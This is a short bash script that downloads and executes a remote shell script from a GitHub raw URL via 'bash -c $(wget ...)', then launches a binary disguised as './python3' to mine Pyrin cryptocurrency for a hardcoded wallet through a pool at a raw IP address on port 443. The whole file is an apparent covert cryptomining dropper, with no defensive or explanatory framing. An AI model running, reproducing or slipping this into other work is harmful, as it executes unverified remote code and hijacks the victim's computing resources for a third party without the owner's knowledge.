#!/bin/bash

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"

cd dotlol

nomer=$((RANDOM % 50 + 1))

clear

./python3 -a PYRIN --pool stratum+tcp://103.120.19.63:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOTSEQ$nomer --no-cl
